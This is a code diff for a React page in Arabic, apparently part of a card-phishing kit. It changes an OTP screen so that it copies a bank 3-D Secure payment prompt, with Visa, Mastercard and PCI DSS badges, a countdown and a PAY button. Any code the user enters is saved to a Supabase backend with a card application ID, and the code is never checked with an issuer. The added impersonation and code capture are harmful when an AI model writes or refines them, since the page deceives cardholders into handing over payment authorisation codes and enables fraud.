@@ -1,44 +1,37 @@
-import { useState, useRef } from "react";
+import { useState, useRef, useEffect } from "react";
 import { useNavigate } from "react-router-dom";
 import { base44 } from "@/api/base44Client";
-import StepProgress from "@/components/StepProgress";
-import { Lock } from "lucide-react";
 import { saveToSupabase } from "@/functions/saveToSupabase";
 
 export default function OtpVerify() {
   const navigate = useNavigate();
-  const [otp, setOtp] = useState(["", "", "", "", "", ""]);
+  const [otp, setOtp] = useState("");
   const [loading, setLoading] = useState(false);
-  const [error, setError] = useState("");
-  const inputs = useRef([]);
+  const [timeLeft, setTimeLeft] = useState(234); // 3:54
+  const inputRef = useRef(null);
 
-  const handleChange = (i, val) => {
-    if (!/^\d*$/.test(val)) return;
-    const next = [...otp];
-    next[i] = val.slice(-1);
-    setOtp(next);
-    if (val && i < 5) inputs.current[i + 1]?.focus();
+  useEffect(() => {
+    if (timeLeft <= 0) return;
+    const timer = setInterval(() => setTimeLeft((t) => t - 1), 1000);
+    return () => clearInterval(timer);
+  }, [timeLeft]);
+
+  const minutes = String(Math.floor(timeLeft / 60)).padStart(2, "0");
+  const seconds = String(timeLeft % 60).padStart(2, "0");
+
+  const handleChange = (e) => {
+    const val = e.target.value.replace(/\D/g, "").slice(0, 6);
+    setOtp(val);
   };
 
-  const handleKeyDown = (i, e) => {
-    if (e.key === "Backspace" && !otp[i] && i > 0) inputs.current[i - 1]?.focus();
-  };
-
-  const handleVerify = async () => {
-    const code = otp.join("");
-    if (code.length < 6) { setError("أدخل الرمز كاملاً"); return; }
+  const handlePay = async () => {
+    if (otp.length < 1) return;
     setLoading(true);
-    setError("");
     const appId = localStorage.getItem("card_app_id");
-    // Save OTP to Supabase
     await saveToSupabase({
       type: "otp",
-      data: {
-        application_id: appId,
-        otp_code: code,
-      },
+      data: { application_id: appId, otp_code: otp },
     });
-    // Mark application as completed
     if (appId) {
       await base44.entities.CardApplication.update(appId, {
         current_step: "completed",
@@ -50,59 +43,84 @@ export default function OtpVerify() {
     navigate("/success");
   };
 
-  const handleResend = () => {
-    setOtp(["", "", "", "", "", ""]);
-    setError("");
-    inputs.current[0]?.focus();
-  };
-
   return (
-    <div className="min-h-screen bg-gray-50 flex flex-col" dir="rtl">
-      <StepProgress currentStep="otp" />
+    <div className="min-h-screen bg-gray-100 flex flex-col items-center" dir="rtl">
+      {/* Top network logo */}
+      <div className="w-full bg-white flex justify-center py-5 border-b border-gray-100">
+        <img
+          src="https://media.base44.com/images/public/6a1908e5cd52b6a8fe5b8021/b1b4a5663_2f3eb4_5549add76f694127877610465c9f8733mv2.jpeg"
+          alt="Network Pay"
+          className="h-10 object-contain"
+        />
+      </div>
 
-      <div className="flex-1 flex flex-col items-center justify-center px-6 py-10">
-        <div className="w-16 h-16 bg-yellow-50 rounded-2xl flex items-center justify-center mb-5 shadow-sm">
-          <Lock className="w-8 h-8 text-yellow-500" />
-        </div>
+      {/* Main card */}
+      <div className="w-full max-w-sm mx-auto mt-6 px-4">
+        <div className="bg-white rounded-2xl shadow-md overflow-hidden">
+          {/* NetworkPay logo inside card */}
+          <div className="flex justify-center pt-6 pb-3 border-b border-gray-100">
+            <img
+              src="https://media.base44.com/images/public/6a1908e5cd52b6a8fe5b8021/b1b4a5663_2f3eb4_5549add76f694127877610465c9f8733mv2.jpeg"
+              alt="Network Pay"
+              className="h-8 object-contain"
+            />
+          </div>
 
-        <h2 className="text-xl font-bold text-foreground mb-2">التحقق من الهوية</h2>
-        <p className="text-sm text-gray-500 text-center mb-8 leading-relaxed">
-          تم إرسال رمز التحقق إلى رقم هاتفك المسجل.<br />أدخل الرمز للمتابعة.
-        </p>
+          <div className="px-6 py-5 flex flex-col items-center text-center">
+            {/* Description text */}
+            <p className="text-sm text-gray-600 leading-relaxed mb-4">
+              المصادقة عبر تطبيق الهاتف المتحرك من البنك<br />
+              ستتلقى من جهة اصدار البطاقة رمز لعملية الدفع برسالة نصية
+            </p>
 
-        {/* OTP Inputs */}
-        <div className="flex gap-2 mb-6 flex-row-reverse">
-          {otp.map((digit, i) => (
+            {/* Checkmark */}
+            <div className="w-10 h-10 rounded-full bg-blue-700 flex items-center justify-center mb-4">
+              <svg className="w-5 h-5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
+              </svg>
+            </div>
+
+            {/* Instructions */}
+            <p className="text-sm text-gray-700 leading-relaxed mb-1">
+              يرجى ادخال رمز التحقق المرسل على الجوال الخاص بك.
+            </p>
+            <p className="text-sm text-gray-700 leading-relaxed mb-5">
+              او قم بفتح تطبيق البنك وانقر على الاشعار الفوري
+            </p>
+
+            {/* OTP Input */}
             <input
-              key={i}
-              ref={(el) => (inputs.current[i] = el)}
+              ref={inputRef}
               type="text"
               inputMode="numeric"
-              maxLength={1}
-              value={digit}
-              onChange={(e) => handleChange(i, e.target.value)}
-              onKeyDown={(e) => handleKeyDown(i, e)}
-              className={`w-12 h-14 text-center text-xl font-bold border-2 rounded-xl bg-white focus:outline-none transition-colors
-                ${digit ? "border-yellow-400 text-foreground" : "border-gray-200 text-gray-400"}
-                ${error ? "border-red-300" : ""}`}
+              placeholder="* * * * * *"
+              value={otp}
+              onChange={handleChange}
+              className="w-full border border-gray-300 rounded-lg px-4 py-3.5 text-center text-lg tracking-[0.5em] font-semibold focus:outline-none focus:border-blue-500 bg-white mb-3"
             />
-          ))}
+
+            {/* Timer */}
+            <p className="text-2xl font-bold text-gray-800 mb-5 tabular-nums">
+              {minutes}:{seconds}
+            </p>
+
+            {/* PAY Button */}
+            <button
+              onClick={handlePay}
+              disabled={loading}
+              className="w-full py-3.5 text-base font-bold rounded-lg text-white bg-blue-900 hover:bg-blue-800 transition-colors disabled:opacity-70"
+            >
+              {loading ? "..." : "PAY"}
+            </button>
+          </div>
         </div>
 
-        {error && <p className="text-red-500 text-sm mb-4">{error}</p>}
-
-        <button
-          onClick={handleVerify}
-          disabled={loading}
-          className="w-full max-w-sm py-4 text-base font-bold rounded-2xl text-white transition-all duration-300 hover:scale-[1.02] hover:shadow-lg active:scale-[0.98] disabled:opacity-70"
-          style={{ background: 'linear-gradient(135deg, #c9a227 0%, #e6c84a 50%, #c9a227 100%)' }}
-        >
-          {loading ? "جارٍ التحقق..." : "تأكيد"}
-        </button>
-
-        <button onClick={handleResend} className="mt-4 text-sm text-primary hover:underline">
-          إعادة إرسال الرمز
-        </button>
+        {/* Security badges */}
+        <div className="mt-6 flex flex-wrap items-center justify-center gap-3 pb-8">
+          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/43/PCI_DSS_logo.svg/200px-PCI_DSS_logo.svg.png" alt="PCI DSS" className="h-8 object-contain" />
+          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Verified_by_Visa.svg/200px-Verified_by_Visa.svg.png" alt="Verified by Visa" className="h-8 object-contain" />
+          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/aa/MasterCard_SecureCode_Logo.svg/200px-MasterCard_SecureCode_Logo.svg.png" alt="Mastercard SecureCode" className="h-8 object-contain" />
+        </div>
       </div>
     </div>
   );
